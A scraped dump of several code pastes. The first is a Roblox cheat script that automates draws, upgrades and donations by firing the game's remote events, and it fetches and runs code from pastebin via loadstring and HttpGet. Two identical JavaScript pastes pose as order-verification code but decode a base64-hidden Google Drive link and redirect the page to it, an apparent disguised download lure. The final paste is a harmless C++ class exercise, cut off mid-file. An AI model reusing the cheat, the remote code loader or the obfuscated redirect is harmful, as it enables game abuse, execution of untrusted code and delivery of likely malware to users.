local playerGui = game.Players.LocalPlayer.PlayerGui;
local lotteryskill = playerGui.GUI:WaitForChild(""二级界面""):WaitForChild(""商店""):WaitForChild(""背景""):WaitForChild(""右侧界面""):WaitForChild(""召唤""):WaitForChild(""技能"");
local skilllevel = lotteryskill:WaitForChild(""等级区域""):WaitForChild(""值"").text;
skilllevel = string.gsub(skilllevel, ""%D"", """");
local skilllevel2 = lotteryskill:WaitForChild(""等级区域""):WaitForChild(""进度条""):WaitForChild(""值""):WaitForChild(""值"").text;
skilllevel2 = string.match(skilllevel2, ""(%d+)/"");
local lotteryweapon = playerGui.GUI:WaitForChild(""二级界面""):WaitForChild(""商店""):WaitForChild(""背景""):WaitForChild(""右侧界面""):WaitForChild(""召唤""):WaitForChild(""法宝"");
local weaponlevel = lotteryweapon:WaitForChild(""等级区域""):WaitForChild(""值"").text;
weaponlevel = string.gsub(weaponlevel, ""%D"", """");
local weaponlevel2 = lotteryweapon:WaitForChild(""等级区域""):WaitForChild(""进度条""):WaitForChild(""值""):WaitForChild(""值"").text;
weaponlevel2 = string.match(weaponlevel2, ""(%d+)/"");
local currency = player:WaitForChild(""值""):WaitForChild(""货币"");
local diamonds = currency:WaitForChild(""钻石"");
local sword_tickets = currency:WaitForChild(""法宝抽奖券"").value;
local skill_tickets = currency:WaitForChild(""技能抽奖券"").value;
local useDiamonds = false;
local Autolotteryspeed = 0.3;
local canstartticket = true;
local canstartticket2 = true;
local function updData()
	skilllevel = lotteryskill:WaitForChild(""等级区域""):WaitForChild(""值"").text;
	skilllevel = string.gsub(skilllevel, ""%D"", """") or 0;
	skilllevel2 = lotteryskill:WaitForChild(""等级区域""):WaitForChild(""进度条""):WaitForChild(""值""):WaitForChild(""值"").text;
	skilllevel2 = string.match(skilllevel2, ""(%d+)/"") or 0;
	weaponlevel = lotteryweapon:WaitForChild(""等级区域""):WaitForChild(""值"").text;
	weaponlevel = string.gsub(weaponlevel, ""%D"", """") or 0;
	weaponlevel2 = lotteryweapon:WaitForChild(""等级区域""):WaitForChild(""进度条""):WaitForChild(""值""):WaitForChild(""值"").text;
	weaponlevel2 = string.match(weaponlevel2, ""(%d+)/"") or 0;
	diamonds = currency:WaitForChild(""钻石"").value;
	sword_tickets = currency:WaitForChild(""法宝抽奖券"").value;
	skill_tickets = currency:WaitForChild(""技能抽奖券"").value;
	print(""技能等級："" .. skilllevel .. ""技能進度："" .. skilllevel2);
	print(""法寶等級："" .. weaponlevel .. ""法寶進度："" .. weaponlevel2);
	print(""鑽石："" .. diamonds .. ""法寶抽獎券："" .. sword_tickets .. ""技能抽獎券："" .. skill_tickets);
end
local function useskill_ticket()
	print(""抽獎：技能"");
	if canstartticket then
		local args = {[1]=""\230\138\128\232\131\189""};
		game:GetService(""ReplicatedStorage""):FindFirstChild(""\228\186\139\228\187\182""):FindFirstChild(""\229\133\172\231\148\168""):FindFirstChild(""\229\149\134\229\186\151""):FindFirstChild(""\229\143\172\229\148\164""):FindFirstChild(""\230\138\189\229\165\150""):FireServer(unpack(args));
	end
end
local function usesword_ticket()
	print(""抽獎：法寶"");
	if canstartticket2 then
		local args = {[1]=""\230\179\149\229\174\157""};
		game:GetService(""ReplicatedStorage""):FindFirstChild(""\228\186\139\228\187\182""):FindFirstChild(""\229\133\172\231\148\168""):FindFirstChild(""\229\149\134\229\186\151""):FindFirstChild(""\229\143\172\229\148\164""):FindFirstChild(""\230\138\189\229\165\150""):FireServer(unpack(args));
	end
end
local function Compareskilltickets()
	if ((skill_tickets <= 8) and useDiamonds) then
		if (diamonds >= 400) then
			local compare = 8 - tonumber(skill_tickets);
			print(""技能抽獎券不足，使用鑽石補足："" .. compare .. ""張"");
			print(""鑽石消耗："" .. (compare * 50));
			useskill_ticket();
		else
			print(""鑽石不足"");
		end
	elseif (skill_tickets >= 8) then
		print(""技能抽獎券足夠"");
		useskill_ticket();
	else
		print(""技能抽獎券不足且沒開啟鑽石補足"");
	end
end
local function Compareweapentickets()
	if ((sword_tickets <= 8) and useDiamonds) then
		if (diamonds > 400) then
			local compare = 8 - tonumber(sword_tickets);
			print(""法寶抽獎券不足，使用鑽石補足："" .. compare .. ""張"");
			print(""鑽石消耗："" .. (compare * 50));
			usesword_ticket();
		else
			print(""鑽石不足"");
		end
	elseif (sword_tickets >= 8) then
		print(""法寶抽獎券足夠"");
		usesword_ticket();
	else
		print(""法寶抽獎券不足且沒開啟鑽石補足"");
	end
end
local function Compareprogress()
	if (skilllevel2 > weaponlevel2) then
		print(""法寶進度小於技能進度"");
		Compareweapentickets();
	elseif (skilllevel2 < weaponlevel2) then
		print(""技能進度小於法寶進度"");
		Compareskilltickets();
	else
		print(""技能進度等於法寶進度"");
		spawn(function()
			Compareskilltickets();
		end);
		Compareweapentickets();
	end
end
local function Comparelevel()
	updData();
	if (skilllevel > weaponlevel) then
		usesword_ticket();
		print(""法寶等級小於技能等級"");
	elseif (skilllevel < weaponlevel) then
		useskill_ticket();
		print(""技能等級小於法寶等級"");
	else
		print(""技能等級等於法寶等級"");
		Compareprogress();
	end
end
features4:AddLabel(""⚠️If lottery tickets are insufficient, it will stop"");
local lotterynum = features4:AddLabel(""Weapon Tickets： "" .. sword_tickets .. ""  Skill Tickets： "" .. skill_tickets);
local function updateExtractedValues()
	local sword_ticketslable = currency:WaitForChild(""法宝抽奖券"").value;
	local skill_ticketslable = currency:WaitForChild(""技能抽奖券"").value;
	lotterynum.Text = ""Weapon Tickets： "" .. sword_ticketslable .. ""  Skill Tickets： "" .. skill_ticketslable;
end
spawn(function()
	while true do
		updateExtractedValues();
		wait(1);
	end
end);
local AutolotterySwitch = features4:AddSwitch(""Auto Draw Weapons/Skills -- Need Fix"", function(bool)
	Autolottery = bool;
	if Autolottery then
		canstartticket = true;
		canstartticket2 = true;
		while Autolottery do
			Comparelevel();
			wait(Autolotteryspeed);
			wait(0.4);
		end
	else
		canstartticket = false;
		canstartticket2 = false;
	end
end);
AutolotterySwitch:Set(false);
local USEDiamondSwitch = features4:AddSwitch(""Enable Diamond Draw"", function(bool)
	useDiamonds = bool;
end);
USEDiamondSwitch:Set(false);
local AutoupdFlyingSwordSwitch = features5:AddSwitch(""Upd Flying Sword"", function(bool)
	AutoupdFlyingSword = bool;
	if AutoupdFlyingSword then
		while AutoupdFlyingSword do
			game:GetService(""ReplicatedStorage""):FindFirstChild(""\228\186\139\228\187\182""):FindFirstChild(""\229\133\172\231\148\168""):FindFirstChild(""\233\163\158\229\137\145""):FindFirstChild(""\229\141\135\231\186\167""):FireServer();
			wait(0.2);
		end
	end
end);
AutoupdFlyingSwordSwitch:Set(false);
local AutoupdskillSwordSwitch = features5:AddSwitch(""Upd weapon/skill"", function(bool)
	AutoupdskillSword = bool;
	if AutoupdskillSword then
		while AutoupdskillSword do
			game:GetService(""ReplicatedStorage""):FindFirstChild(""\228\186\139\228\187\182""):FindFirstChild(""\229\133\172\231\148\168""):FindFirstChild(""\230\179\149\229\174\157""):FindFirstChild(""\229\141\135\231\186\167\229\133\168\233\131\168\230\179\149\229\174\157""):FireServer();
			game:GetService(""ReplicatedStorage""):FindFirstChild(""\228\186\139\228\187\182""):FindFirstChild(""\229\133\172\231\148\168""):FindFirstChild(""\230\138\128\232\131\189""):FindFirstChild(""\229\141\135\231\186\167\229\133\168\233\131\168\230\138\128\232\131\189""):FireServer();
			wait(1.5);
		end
	end
end);
AutoupdskillSwordSwitch:Set(false);
local AutoupdRuneSwordSwitch = features5:AddSwitch(""Upd Rune"", function(bool)
	AutoupdRuneSwordSwitch = bool;
	if AutoupdRuneSwordSwitch then
		while AutoupdRuneSwordSwitch do
			game:GetService(""ReplicatedStorage""):FindFirstChild(""\228\186\139\228\187\182""):FindFirstChild(""\229\133\172\231\148\168""):FindFirstChild(""\233\152\181\230\179\149""):FindFirstChild(""\229\141\135\231\186\167""):FireServer();
			wait(0.2);
		end
	end
end);
AutoupdRuneSwordSwitch:Set(false);
local Guidename = playerGui.GUI:WaitForChild(""二级界面""):WaitForChild(""公会""):WaitForChild(""背景""):WaitForChild(""右侧界面""):WaitForChild(""主页""):WaitForChild(""介绍""):waitForChild(""名称""):waitForChild(""文本""):waitForChild(""文本"").Text;
local Donatetimes = playerGui.GUI:WaitForChild(""二级界面""):WaitForChild(""公会""):WaitForChild(""捐献""):WaitForChild(""背景""):WaitForChild(""按钮""):WaitForChild(""确定按钮""):WaitForChild(""次数"").Text;
local Donatetimesnumber = tonumber(string.match(Donatetimes, ""%d+""));
local Guildname = features5:AddLabel(""Guide Name：Need chack Upd Guide"" .. "" || Contribute times： "" .. Donatetimesnumber);
features5:AddButton(""Upd Guide"", function()
	local replicatedStorage = game:GetService(""ReplicatedStorage"");
	local event = replicatedStorage:FindFirstChild(""打开公会"", true);
	event:Fire(""打开公会"");
	wait(0.5);
	Donatetimes = playerGui.GUI:WaitForChild(""二级界面""):WaitForChild(""公会""):WaitForChild(""捐献""):WaitForChild(""背景""):WaitForChild(""按钮""):WaitForChild(""确定按钮""):WaitForChild(""次数"").Text;
	Donatetimesnumber = tonumber(string.match(Donatetimes, ""%d+""));
	Guildname.Text = ""Guide Name："" .. Guidename .. "" || Contribute times： "" .. Donatetimesnumber;
end);
local AutoDonateSwitch = features5:AddSwitch(""Auto Contribute"", function(bool)
	AutoDonate = bool;
	if AutoDonate then
		while AutoDonate do
			Donatetimes = playerGui.GUI:WaitForChild(""二级界面""):WaitForChild(""公会""):WaitForChild(""捐献""):WaitForChild(""背景""):WaitForChild(""按钮""):WaitForChild(""确定按钮""):WaitForChild(""次数"").Text;
			Donatetimesnumber = tonumber(string.match(Donatetimes, ""%d+""));
			Guildname.Text = ""Guide Name："" .. Guidename .. "" || Contribute times： "" .. Donatetimesnumber;
			if (Donatetimesnumber > 0) then
				game:GetService(""ReplicatedStorage""):FindFirstChild(""\228\186\139\228\187\182""):FindFirstChild(""\229\133\172\231\148\168""):FindFirstChild(""\229\133\172\228\188\154""):FindFirstChild(""\230\141\144\231\140\174""):FireServer();
			end
			wait(0.5);
		end
	end
end);
AutoDonateSwitch:Set(false);
local replicatedStorage = game:GetService(""ReplicatedStorage"");
features6:AddButton(""Daily Tasks"", function()
	local event = replicatedStorage:FindFirstChild(""打开每日任务"", true);
	if (event and event:IsA(""BindableEvent"")) then
		event:Fire(""打開每日任務"");
	end
end);
features6:AddButton(""Mail"", function()
	local event = replicatedStorage:FindFirstChild(""打开邮件"", true);
	if (event and event:IsA(""BindableEvent"")) then
		event:Fire(""打开郵件"");
	end
end);
features6:AddButton(""Wheel"", function()
	local event = replicatedStorage:FindFirstChild(""打开转盘"", true);
	if (event and event:IsA(""BindableEvent"")) then
		event:Fire(""打開轉盤"");
	end
end);
features6:AddButton(""Formation"", function()
	local event = replicatedStorage:FindFirstChild(""打开阵法"", true);
	if (event and event:IsA(""BindableEvent"")) then
		event:Fire(""打开陣法"");
	end
end);
features6:AddButton(""World Tree"", function()
	local event = replicatedStorage:FindFirstChild(""打开世界树"", true);
	if (event and event:IsA(""BindableEvent"")) then
		event:Fire(""打開世界樹"");
	end
end);
features6:AddButton(""Training Bench"", function()
	local event = replicatedStorage:FindFirstChild(""打开炼器台"", true);
	if (event and event:IsA(""BindableEvent"")) then
		event:Fire(""打開練器台"");
	end
end);
features6:AddButton(""Alchemy Furnace"", function()
	local event = replicatedStorage:FindFirstChild(""打开炼丹炉"", true);
	if (event and event:IsA(""BindableEvent"")) then
		event:Fire(""打開煉丹爐"");
	end
end);
features7:AddLabel("" -- 語言配置/language config"");
features7:AddButton(""刪除語言配置/language config delete"", function()
	local HttpService = game:GetService(""HttpService"");
	function deleteConfigFile()
		if isfile(""Cultivation_languageSet.json"") then
			delfile(""Cultivation_languageSet.json"");
			print(""配置文件 Cultivation_languageSet.json 已刪除。"");
		else
			print(""配置文件 Cultivation_languageSet.json 不存在，無法刪除。"");
		end
	end
	deleteConfigFile();
end);
features7:AddLabel(""- - Statistics"");
features7:AddButton(""每秒擊殺/金幣數"", function()
	loadstring(game:HttpGet(""https://pastebin.com/raw/0NqSi46N""))();
	loadstring(game:HttpGet(""https://pastebin.com/raw/HGQXdAiz""))();
end);
features7:AddLabel("" If you have any questions or ideas, leave a comment on GitHub."");
features7:AddButton(""Github Link"", function()
	local urlToCopy = ""https://github.com/Tseting-nil"";
	if setclipboard then
		setclipboard(urlToCopy);
		showNotification(""Link Copied:) ！！"");
	else
		showNotification(""error！Link：github.com/Tseting-nil"");
	end
end);"
fCXGbSpf,Products.js,rodrigomaise99,JavaScript,Wednesday 2nd of April 2025 05:51:33 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/665/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
YZ0RNnh9,Order.js,rodrigomaise99,JavaScript,Wednesday 2nd of April 2025 05:36:11 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/489/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
GHS7Ca9z,Untitled,UsSe3wa,C++,Wednesday 2nd of April 2025 05:29:07 AM CDT,"#include <bits/stdc++.h>
using namespace std;

////////////////////////////
//  Animal Class Hierarchy
////////////////////////////

class Animal {
protected:
    string name;
    int days;
public:
    Animal(const string &n, int d) : name(n), days(d) {}
    virtual ~Animal() {}
    string getName() const { return name; }
    int getDaysLived() const { return days; }
    void setDaysLived(int d) { days = d; }
    virtual void sayName() const {
        cout << ""My name is "" << name << "", days lived: "" << days << ""\n"";
    }
    virtual void attack(Animal &other) const = 0; // For ATTACK command
    virtual int getLevel() const = 0; // 1: base, 2: better, 3: monster
    virtual string getTypeCode() const = 0; // e.g., ""M"", ""BM"", etc.
    virtual string getClassName() const = 0;  // e.g., ""Mouse"", ""BetterMouse"", etc.
};

// ----- Mouse Types -----
class Mouse : public Animal {
public:
    Mouse(const string &n, int d) : Animal(n, d) {}
    void attack(Animal &other) const override { cout << ""Mouse is attacking\n""; }
    int getLevel() const override { return 1; }
    string getTypeCode() const override { return ""M""; }
    string getClassName() const override { return ""Mouse""; }
};

class BetterMouse : public Animal {
public:
    BetterMouse(const string &n, int d) : Animal(n, d) {}
    void attack(Animal &other) const override { cout << ""BetterMouse is attacking\n""; }
    int getLevel() const override { return 2; }
    string getTypeCode() const override { return ""BM""; }
    string getClassName() const override { return ""BetterMouse""; }
};

class MonsterMouse : public Animal {
public:
    MonsterMouse(const string &n) : Animal(n, 1) {} // Monster lives at most 1 day
    void attack(Animal &other) const override { cout << ""MonsterMouse is attacking\n""; }
    int getLevel() const override { return 3; }
    string getTypeCode() const override { return ""MonsterMouse""; }
    string getClassName() const override { return ""MonsterMouse""; }
};

// ----- Bird Types -----
class Bird : public Animal {
public:
    Bird(const string &n, int d) : Animal(n, d) {}
    void attack(Animal &other) const override { cout << ""Bird is attacking\n""; }
    int getLevel() const override { return 1; }
    string getTypeCode() const override { return ""B""; }
    string getClassName() const override { return ""Bird""; }
};

class BetterBird : public Animal {
public:
    BetterBird(const string &n, int d) : Animal(n, d) {}
    void attack(Animal &other) const override { cout << ""BetterBird is attacking\n""; }
    int getLevel() const override { return 2; }
    string getTypeCode() const override { return ""BB""; }
    string getClassName() const override { return ""BetterBird""; }
};

class MonsterBird : public Animal {
public:
    MonsterBird(const string &n) : Animal(n, 1) {}
    void attack(Animal &other) const override { cout << ""MonsterBird is attacking\n""; }
    int getLevel() const override { return 3; }
    string getTypeCode() const override { return ""MonsterBird""; }
    string getClassName() const override { return ""MonsterBird""; }
};

// ----- Fish Types -----
class Fish : public Animal {
public:
    Fish(const string &n, int d) : Animal(n, d) {}
    void attack(Animal &other) const override { cout << ""Fish is attacking\n""; }
    int getLevel() const override { return 1; }
    string getTypeCode() const override { return ""F""; }
    string getClassName() const override { return ""Fish""; }
};

class BetterFish : public Animal {
public:
    BetterFish(const string &n, int d) : Animal(n, d) {}
    void attack(Animal &other) const override { cout << ""BetterFish is attacking\n""; }
    int getLevel() const override { return 2; }
    string getTypeCode() const override { return ""BF""; }
    string getClassName() const override { return ""BetterFish""; }
};

class MonsterFish : public Animal {
public:
    MonsterFish(const string &n) : Animal(n, 1) {}
    void attack(Animal &other) const override { cout << ""MonsterFish is attacking\n""; }
    int getLevel() const override { return 3; }
    string getTypeCode() const override { return ""MonsterFish""; }
    string getClassName() const override { return ""MonsterFish""; }
};

//////////////////////////////
//  Container Templates     //
//////////////////////////////

template <typename T>
class Cage {
public:
    vector<T*> animals;
    void add(T* a) {
        animals.push_back(a);
        sortContainer();
    }
    T* get(int pos) {
        if(pos < 0 || pos >= (int)animals.size()) return nullptr;
        return animals[pos];
    }
    void remove(int pos) {
        if(pos < 0 || pos >= (int)animals.size()) return;
        delete animals[pos];
        animals.erase(animals.begin() + pos);
    }
    int size() { return (int)animals.size(); }
    void sortContainer() {
        sort(animals.begin(), animals.end(), [](T* a, T* b){
            if(a->getDaysLived() != b->getDaysLived())
                return a->getDaysLived() < b->getDaysLived();
            return a->getName() < b->getName();
        });
    }
    void updatePeriod() {
        for(auto a : animals)
            a->setDaysLived(a->getDaysLived() + 1);
        vector<int> dead;
        for (int i = 0; i < (int)animals.size(); i++){
            bool isMonster = (animals[i]->getLevel() == 3);
            if((!isMonster && animals[i]->getDaysLived() > 10) ||
               (isMonster && animals[i]->getDaysLived() > 1))
                dead.push_back(i);
        }
        for (int idx : dead)
            cout << animals[idx]->getName() << "" has died of old days\n"";
        for (int i = dead.size()-1; i >= 0; i--){
            int idx = dead[i];
            delete animals[idx];
            animals.erase(animals.begin()+idx);
        }
        sortContainer();
    }
};

template <> class Cage<Fish> { 
public:
    Cage() { throw runtime_error(""Cage<Fish> is forbidden""); } 
};

template <typename T>
class Aquarium {
public:
    vector<T*> animals;
    void add(T* a) {
        animals.push_back(a);
        sortContainer();
    }
    T* get(int pos) {
        if(pos < 0 || pos >= (int)animals.size()) return nullptr;
        return animals[pos];
    }
    void remove(int pos) {
        if(pos < 0 || pos >= (int)animals.size()) return;
        delete animals[pos];
        animals.erase(animals.begin() + pos);
    }
    int size() { return (int)animals.size(); }
    void sortContainer() {
        sort(animals.begin(), animals.end(), [](T* a, T* b){
            if(a->getDaysLived() != b->getDaysLived())
                return a->getDaysLived() < b->getDaysLived();
            return a->getName() < b->getName();
        });
    }
    void updatePeriod() {
        for(auto a : animals)
            a->setDaysLived(a->getDaysLived() + 1);
        vector<int> dead;
        for (int i = 0; i < (int)animals.size(); i++){
            bool isMonster = (animals[i]->getLevel() == 3);
            if((!isMonster && animals[i]->getDaysLived() > 10) ||
               (isMonster && animals[i]->getDaysLived() > 1))
                dead.push_back(i);
        }
        for (int idx : dead)
            cout << animals[idx]->getName() << "" has died of old days\n"";
        for (int i = dead.size()-1; i >= 0; i--){
            int idx = dead[i];
            delete animals[idx];
            animals.erase(animals.begin()+idx);
        }
        sortContainer();
    }
};

template <> class Aquarium<Bird> {
public:
    Aquarium() { throw runtime_error(""Aquarium<Bird> is forbidden""); }
};

template <typename A>
class Freedom {
public:
    vector<A*> animals;
    void add(A* a) {
        animals.push_back(a);
        sortContainer();
    }
    A* get(int pos) {
        if(pos < 0 || pos >= (int)animals.size()) return nullptr;
        return animals[pos];
    }
    void remove(int pos) {
        if(pos < 0 || pos >= (int)animals.size()) return;
        delete animals[pos];
        animals.erase(animals.begin() + pos);
    }
    int size() { return (int)animals.size(); }
    void sortContainer() {
        sort(animals.begin(), animals.end(), [](A* a, A* b){
            if(a->getDaysLived() != b->getDaysLived())
                return a->getDaysLived() < b->getDaysLived();
            return a->getName() < b->getName();
        });
    }
    void updatePeriod() {
        for(auto a : animals)
            a->setDaysLived(a->getDaysLived() + 1);
        vector<int> dead;
        for (int i = 0; i < (int)animals.size(); i++){
            bool isMonster = (animals[i]->getLevel() == 3);
            if((!isMonster && animals[i]->getDaysLived() > 10) ||
               (isMonster && animals[i]->getDaysLived() > 1))
                dead.push_back(i);
        }
        for (int idx : dead)
            cout << animals[idx]->getName() << "" has died of old days\n"";
        for (int i = dead.size()-1; i >= 0; i--){
            int idx = dead[i];
            delete animals[idx];
            animals.erase(animals.begin()+idx);
        }
        sortContainer();
    }
};

//////////////////////////////////
// Global Containers (in order)
//////////////////////////////////
// Order: Cage<Bird>, Cage<BetterBird>, Cage<Mouse>, Cage<BetterMouse>,
// Aquarium<Fish>, Aquarium<BetterFish>, Aquarium<Mouse>, Aquarium<BetterMouse>,
// Freedom<Animal>
Cage<Bird> cageBird;
Cage<BetterBird> cageBetterBird;
Cage<Mouse> cageMouse;
Cage<BetterMouse> cageBetterMouse;
Aquarium<Fish> aquariumFish;
Aquarium<BetterFish> aquariumBetterFish;
Aquarium<Mouse> aquariumMouse;
Aquarium<BetterMouse> aquariumBetterMouse;
Freedom<Animal> freedom;

//////////////////////////////
// Helper Functions         //
//////////////////////////////

// Place an animal into the appropriate container.
void placeAnimal(Animal* a, const string &type, const string &cont) {
    if(cont==""Cage""){
        if(type==""M"")          cageMouse.add((Mouse*)a);
        else if(type==""BM"")    cageBetterMouse.add((BetterMouse*)a);
        else if(type==""B"")     cageBird.add((Bird*)a);
        else if(type==""BB"")    cageBetterBird.add((BetterBird*)a);
    } else if(cont==""Aquarium""){
        if(type==""F"")          aquariumFish.add((Fish*)a);
        else if(type==""BF"")    aquariumBetterFish.add((BetterFish*)a);
        else if(type==""M"")     aquariumMouse.add((Mouse*)a);
        else if(type==""BM"")    aquariumBetterMouse.add((BetterMouse*)a);
    } else if(cont==""Freedom""){
        freedom.add(a);
    }
}

// Get an animal from the specified container.
Animal* getAnimal(const string &cont, const string &type, int pos) {
    if(cont==""Cage""){
        if(type==""M"") return cageMouse.get(pos);
        else if(type==""BM"") return cageBetterMouse.get(pos);
        else if(type==""B"") return cageBird.get(pos);
        else if(type==""BB"") return cageBetterBird.get(pos);
    } else if(cont==""Aquarium""){
        if(type==""F"") return aquariumFish.get(pos);
        else if(type==""BF"") return aquariumBetterFish.get(pos);
        else if(type==""M"") return aquariumMouse.get(pos);
        else if(type==""BM"") return aquariumBetterMouse.get(pos);
    } else if(cont==""Freedom""){
        return freedom.get(pos);
    }
    return nullptr;
}

// Remove an animal from the specified container.
void removeAnimal(const string &cont, const string &type, int pos) {
    if(cont==""Cage""){
        if(type==""M"")          cageMouse.remove(pos);
        else if(type==""BM"")    cageBetterMouse.remove(pos);
        else if(type==""B"")     cageBird.remove(pos);
        else if(type==""BB"")    cageBetterBird.remove(pos);
    } else if(cont==""Aquarium""){
        if(type==""F"")          aquariumFish.remove(pos);
        else if(type==""BF"")    aquariumBetterFish.remove(pos);
        else if(type==""M"")     aquariumMouse.remove(pos);
        else if(type==""BM"")    aquariumBetterMouse.remove(pos);
    } else if(cont==""Freedom""){
        freedom.remove(pos);
    }
}

//////////////////////////////
// Command Implementations  //
//////////////////////////////

// CREATE <TYPE> <NAME> IN <CONTAINER> <N>
void commandCreate(const string &type, const string &name, const string &container, int d) {
    Animal* a = nullptr;
    if(type==""M"")       a = new Mouse(name, d);
    else if(type==""BM"") a = new BetterMouse(name, d);
    else if(type==""B"")  a = new Bird(name, d);
    else if(type==""BB"") a = new BetterBird(name, d);
    else if(type==""F"")  a = new Fish(name, d);
    else if(type==""BF"") a = new BetterFish(name, d);
    placeAnimal(a, type, container);
    cout << ""My name is "" << name << "", days lived: "" << d << ""\n"";
}

// APPLY_SUBSTANCE <CONTAINER> <TYPE> <POS>
void commandApplySubstance(const string &container, const string &type, int pos) {
    if(container==""Freedom""){
        cout << ""Substance cannot be applied in freedom\n"";
        return;
    }
    Animal* a = getAnimal(container, type, pos);
    if(!a){
        cout << ""Animal not found\n"";
        return;
    }
    int lvl = a->getLevel();
    string nm = a->getName();
    int d = a->getDaysLived();
    if(lvl == 1) { // base -> better
        int newDays = (d + 1) / 2;
        removeAnimal(container, type, pos);
        Animal* b = nullptr;
        string newType;
        if(type==""M"") { b = new BetterMouse(nm, newDays); newType = ""BM""; }
        else if(type==""B"") { b = new BetterBird(nm, newDays); newType = ""BB""; }
        else if(type==""F"") { b = new BetterFish(nm, newDays); newType = ""BF""; }
        placeAnimal(b, newType, container);
    } else if(lvl == 2) { // better -> monster
        removeAnimal(container, type, pos);
        Animal* m = nullptr;
        if(type==""BM"") m = new MonsterMouse(nm);
        else if(type==""BB"") m = new MonsterBird(nm);
        else if(type==""BF"") m = new MonsterFish(nm);
        // Kill all remaining animals in that container (of that type group) silently.
        if(container==""Cage""){
            if(type==""BM""){
                while(cageBetterMouse.size() > 0)
                    cageBetterMouse.remove(0);
            } else if(type==""BB""){
                while(cageBetterBird.size() > 0)
                    cageBetterBird.remove(0);
            }
        } else if(container==""Aquarium""){
            if(type==""BM""){
                while(aquariumBetterMouse.size() > 0)
                    aquariumBetterMouse.remove(0);
            } else if(type==""BF""){
                while(aquariumBetterFish.size() > 0)
                    aquariumBetterFish.remove(0);
            }
        }
        freedom.add(m);
    }
    // If already monster, do nothing.
}

// REMOVE_SUBSTANCE <CONTAINER> <TYPE> <POS>
void commandRemoveSubstance(const string &container, const string &type, int pos) {
    if(container==""Freedom""){
        cout << ""Substance cannot be removed in freedom\n"";
        return;
    }
    Animal* a = getAnimal(container, type, pos);
    if(!a){
        cout << ""Animal not found\n"";
        return;
    }
    if(a->getLevel() != 2){
        cout << ""Invalid substance removal\n"";
        return;
    }
    int newDays = a->getDaysLived() * 2;
    string nm = a->getName();
    removeAnimal(container, type, pos);
    Animal* base = nullptr;
    string baseType;
    if(type==""BM"") { base = new Mouse(nm, newDays); baseType = ""M""; }
    else if(type==""BB"") { base = new Bird(nm, newDays); baseType = ""B""; }
    else if(type==""BF"") { base = new Fish(nm, newDays); baseType = ""F""; }
    placeAnimal(base, baseType, container);
}

// ATTACK <CONTAINER> <TYPE> <POS1> <POS2>
// Print ""<AnimalClassName> is attacking"" and remove the attacked animal (at pos2).
void commandAttack(const string &container, const string &type, int pos1, int pos2) {
    if(container==""Freedom""){
        cout << ""Animals cannot attack in Freedom\n"";
        return;
    }
    if(pos1 == pos2) return;
    Animal* a1 = getAnimal(container, type, pos1);
    Animal* a2 = getAnimal(container, type, pos2);
    if(!a1 || !a2){
        cout << ""Animal not found\n"";
        return;
    }
    cout << a1->getClassName() << "" is attacking\n"";
    removeAnimal(container, type, pos2);
}

// TALK <CONTAINER> <TYPE> <POS>
// For Freedom, no type is provided.
void commandTalk(const string &container, const string &type, int pos) {
    Animal* a = (container==""Freedom"" ? freedom.get(pos) : getAnimal(container, type, pos));
    if(!a){
        cout << ""Animal not found\n"";
        return;
    }
    a->sayName();
}

// PERIOD: Update containers in the order:
// Cage<Bird>, Cage<BetterBird>, Cage<Mouse>, Cage<BetterMouse>,
// Aquarium<Fish>, Aquarium<BetterFish>, Aquarium<Mouse>, Aquarium<BetterMouse>,
// Freedom<Animal>
void commandPeriod() {
    cageBird.updatePeriod();
    cageBetterBird.updatePeriod();
    cageMouse.updatePeriod();
    cageBetterMouse.updatePeriod();
    aquariumFish.updatePeriod();
    aquariumBetterFish.updatePeriod();
    aquariumMouse.updatePeriod();
    aquariumBetterMouse.updatePeriod();
    freedom.updatePeriod();
}

//////////////////////
// Main Entry Point //
//////////////////////

int main(){
    ios::sync_with_stdio(false);
    cin.tie(nullptr);
    int C; 
    cin >> C; 
    cin.ignore(numeric_limits<streamsize>::max(), '\n');
    while(C--){
        string line; 
        getline(cin, line);
        if(line.empty()) continue;
        stringstream ss(line);
        string cmd; ss >> cmd;
        if(cmd==""CREATE""){
            string type, name, inWord, container;
            int d;
            ss >> type >> name >> inWord >> container >> d;
            commandCreate(type, name, container, d);
        } else if(cmd==""APPLY_SUBSTANCE""){
            string container, type; int pos;
            ss >> container >> type >> pos;
            commandApplySubstance(container, type, pos);
        } else if(cmd==""REMOVE_SUBSTANCE""){
            string container, type; int pos;
            ss >> container >> type >> pos;
